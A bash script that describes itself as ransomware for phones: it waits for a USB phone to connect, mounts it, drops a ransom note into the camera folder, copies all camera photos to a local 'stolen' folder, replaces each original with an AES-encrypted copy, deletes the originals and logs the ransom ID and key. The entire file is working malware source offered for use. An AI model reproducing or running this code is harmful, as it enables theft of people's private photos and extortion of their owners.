#!/bin/bash
#This script will wait for a phone to be plugged in, steal its camera photos, and encrypt them

#wait until phone is connected (not mounted)
LOCALPATH=$(pwd)
oldusblist=$(lsusb)
usbcount=$(lsusb | wc -l) 
newcount=$usbcount

echo 'Waiting for connection...'
while [ $usbcount -eq $newcount ]; do	
	newcount=$(lsusb | wc -l)
done

#mount phone
gvfs-mount -li | awk -F= '{if(index($2,"mtp") == 1)system("gvfs-mount "$2)}'

#waits/checks if unlocked
echo 'Connected. Waiting for unlock...'
until [ -d /run/user/$UID/gvfs/mtp*/* ]; do	
	:
done

#navigates and tests access to file system
cd /run/user/$UID/gvfs/mtp*/*
ls
echo 'FILE SYSTEM ACCESSED!'

cd "$LOCALPATH"

PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
echo $PHONEPATH

#drop ransom note
ransomid=$(openssl rand 16 -hex)
echo "Dropping note..."
gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png"
echo "Note dropped as ransom_$ransomid.png"
echo ""

#make folder to store stolen files. named as device serial number and timestamp
cd data/stolen
deviceinfo=$(lsusb | grep -v "$oldusblist")
devicebus=$(echo $deviceinfo | awk -F' |: ' '/Device /{gsub(" "," ");print $2}')
devicenumber=$(echo $deviceinfo | awk -F' |: ' '/Device /{gsub(" "," ");print $4}')

DEVICEID=$(udevadm info --name=/dev/bus/usb/$devicebus/$devicenumber | awk -F'=' '/ID_SERIAL=/{gsub("_"," ");print $2}')

timestamp=$(date)
TRANSDIR="$DEVICEID $timestamp"
mkdir "$TRANSDIR"

#transfer and encrypt files. REMINDER: don't encrypt the note
enc_key=$(openssl rand 16 -hex)

cd "$PHONEPATH"

currentfile=1
filecount=$(ls -1 | grep -v "ransom" | grep -v ".enc.jpg" | wc -l)

for f in *
do 
	
	if [[ $f != "ransom"* ]] && [[ $f != *".enc.jpg" ]]; then #encrypt all files that are not already encrypted nor the ransom note file
		echo "transferring and encrypting $f ($currentfile/$filecount)..."
		gvfs-copy "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
		openssl aes-256-cbc -a -salt -in "$LOCALPATH/data/stolen/$TRANSDIR/$f" -out "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" -k $enc_key
		#dont forget to delete orginal file
		gvfs-copy "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .		
		rm $f
		currentfile=$((currentfile+1))
	fi

done
cd "$LOCALPATH"
sleep 1
gvfs-copy "media/ransomnote.png" "$PHONEPATH/ransom_$ransomid.png" #re-copy note so it shows up first in gallery

echo `date --rfc-3339=seconds` "|" $ransomid "|" $enc_key >> keys/keys.txt #store ransomid and encryption key pair
echo Encryption complete. check keys/keys.txt for ransom id and key
echo Transferred photos stored in data/stolen/$TRANSDIR
echo ""
